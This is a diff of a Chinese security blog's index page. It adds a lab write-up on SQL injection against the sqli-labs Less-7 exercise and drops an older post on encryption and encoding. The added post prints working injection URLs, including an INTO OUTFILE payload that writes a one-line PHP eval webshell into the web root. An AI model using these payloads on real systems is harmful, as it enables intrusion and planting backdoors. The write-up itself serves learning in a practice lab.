@@ -64,6 +64,77 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-文件导入导出-SQL靶场" class="post-文件导入导出-SQL靶场 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">文件导入导出-SQL靶场</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckz757epc000j8omaboqudaa3" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+<p> 使用条件：</p>
+<p> A、必须有权限读取并且文件必须完全可读 </p>
+<p>​       <code>and (select count(*) from mysql.user)&gt;0/*</code> 如果结果返回正常,说明具有读写权限。 </p>
+<p>​       <code>and (select count(*)  from mysql.user)&gt;0/*</code> 返回错误，应该是管理员给数据库帐户降权 </p>
+<p>B、欲读取文件必须在服务器上 </p>
+<p>C、必须指定文件完整的路径</p>
+<p>D、欲读取文件必须小于 <code>max_allowed_packet</code> </p>
+<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users 就别想 load_file 出来。</p>
+<p>常用路径：</p>
+<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5729087.html">http://www.cnblogs.com/lcamry/p/5729087.html</a></p>
+<p>这里以Less-7为例。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>根据源代码，对<code>id</code>参数的处理需要<code>&#39;))</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) or 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p>可以看到回显正常，注入成功。</p>
+<p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203230429238.png" alt="image-20220203230429238"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来进行文件导入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) union select 1,2,&#x27;3&#x27; into outfile &#x27;d:/1.txt&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203231905997.png" alt="image-20220203231905997"></p>
+<p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203232014451.png" alt="image-20220203232014451"></p>
+<p>虽然说回显是报错，但打开D盘看到已经将文件进行了导入</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>把一句话木马导入进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_post[“mima”])?&gt;&#x27; into outfile &#x27;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\yijuhua.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203232725209.png" alt="image-20220203232725209"></p>
+<p><img src="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/image-20220203233022997.png" alt="image-20220203233022997"></p>
+<p>可以看到一句话木马已经植入成功；后续可以用菜刀等webshell管理工具连接即可。这里可以导入的内容很多，根据情况可以自行导入。对于这样的情况，可以一步到位，拿到shell。</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">
+    <time datetime="2022-02-03T14:57:29.000Z" class="entry-date">
+        2022-02-03
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-盲注-SQL靶场" class="post-盲注-SQL靶场 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -79,7 +150,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckz72pqz7000j7cmaahzh0n6y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckz757epd000k8oma6tra4yzo" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -377,7 +448,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckz72pqyr00037cma1cwadewl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckz757eox00038omahjje21ot" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -486,7 +557,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckz72pqyq00027cma46mnb9dk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckz757eow00028oma1w0s7amc" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -572,7 +643,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckz72pqyt00057cma5mwk6e5x" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckz757eoy00048omafk3hftub" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -709,7 +780,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckz72pqyh00007cma8540hwsc" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckz757eou00018oma8dvnet0h" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -906,7 +977,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/" data-id="ckz72pqz8000k7cmaghtbcpki" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/" data-id="ckz757epe000m8omafwqd84ix" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1026,7 +1097,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="ckz72pqyu00067cma2i1u5f4x" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/WEB%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="ckz757ep000078oma004tcl6o" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1092,7 +1163,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/" data-id="ckz72pqz6000i7cmaaeq8a4zt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/" data-id="ckz757epa000g8oma8cqr4aiy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1177,7 +1248,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" data-id="ckz72pqyo00017cma3lbd0zmh" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/28/CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" data-id="ckz757eoq00008omadwwr7req" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1233,77 +1304,10 @@
 
 
   
-    <article id="post-加密编码算法" class="post-加密编码算法 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">加密编码算法</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/" data-id="ckz72pqyv00077cmadqqsho1u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。</p>
-<p>###常见加密编码等算法</p>
-<p><strong>MD5</strong>，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</p>
-<p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127213911368.png" alt="image-20220127213911368"></p>
-<p>MD5解密不是从密文直接解密到明文，平台通过提交的密文与平台原来已经跑出来的密文进行对比，如果相匹配，则将已经用跑出来的密文对应的明文呈现给用户。<strong>（不是逆向解密）</strong></p>
-<p>Unescape编码判断：%u+4个数字</p>
-<p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127220601104.png" alt="image-20220127220601104"></p>
-<p>AES加密方式，输出是使用Base64格式/Hex格式；则，若遇到Base64格式/Hex格式解密得到的是乱码，应该往AES加密方式去想。</p>
-<p>AES解密的话，必须要知道<strong>密码</strong>和<strong>偏移量</strong>。</p>
-<p><img src="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/image-20220127221301364.png" alt="image-20220127221301364"></p>
-<h3 id="常见加密形式算法"><a href="#常见加密形式算法" class="headerlink" title="常见加密形式算法"></a>常见加密形式算法</h3><p>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
-<h3 id="常见解密方式（针对）"><a href="#常见解密方式（针对）" class="headerlink" title="常见解密方式（针对）"></a>常见解密方式（针对）</h3><p>枚举，自定义逆向算法，可逆向</p>
-<h3 id="常规加密算法的特性"><a href="#常规加密算法的特性" class="headerlink" title="常规加密算法的特性"></a>常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p>
-<p>###某 CMS 密码加密解密</p>
-<p>MD5+salt格式：md5(md5($pass)$salt);</p>
-<p>这样的加密方式：</p>
-<p>是先对密码进行了md5加密：md5($pass)，而md5长度16位和32位都有可能并且又加了salt，可能性很多，基本无解；</p>
-<p>再进行了md5加密，相当于两次md5加密。</p>
-<p>（如果拿不到salt或其他的信息，无解）</p>
-<p>在安全测试过程中，遇到解密的时候，一定要清楚其是什么加密算法，什么加密方法，再想其解密方法。</p>
-<h3 id="某实际应用-URL-地址参数加密"><a href="#某实际应用-URL-地址参数加密" class="headerlink" title="某实际应用 URL 地址参数加密"></a>某实际应用 URL 地址参数加密</h3><p>搜索特定关键字加密字符串</p>
-<p>例如：国外的网站，SQL注入时候涉及加解密问题，如果直接使用工具去注入，工具不懂加解密，肯定会注入有问题。（谷歌连接国外的网站超时，图没截到，文字描述了）</p>
-<p><strong>知识点的扩展程度是测试深度的前提。</strong></p>
-<h2 id="其他资源"><a href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>CMD5网站地址：<a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
-<p>在线加解密工具：<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2022/01/27/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/">
-    <time datetime="2022-01-27T13:21:21.000Z" class="entry-date">
-        2022-01-27
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
       </nav>
     </nav>
   
@@ -1329,6 +1333,10 @@
       <ul>
         
           <li>
+            <a href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">文件导入导出-SQL靶场</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/">盲注-SQL靶场</a>
           </li>
         
@@ -1342,10 +1350,6 @@
         
           <li>
             <a href="/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/">SQL注入字符型和数字型判断</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/30/Less1-Less4/">Less1-Less4</a>
           </li>
         
       </ul>
